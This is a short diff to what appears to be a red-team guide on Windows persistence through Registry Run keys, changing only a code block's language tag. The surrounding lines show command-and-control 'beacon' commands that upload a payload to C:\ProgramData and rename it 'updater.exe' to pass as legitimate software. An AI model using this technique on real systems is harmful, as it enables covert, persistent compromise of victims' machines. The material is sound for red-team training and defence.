@@ -25,7 +25,7 @@ reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
 
 AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on.
 
-```
+```powershell
 beacon> cd C:\ProgramData
 beacon> upload C:\Payloads\http_x64.exe
 beacon> mv http_x64.exe updater.exe
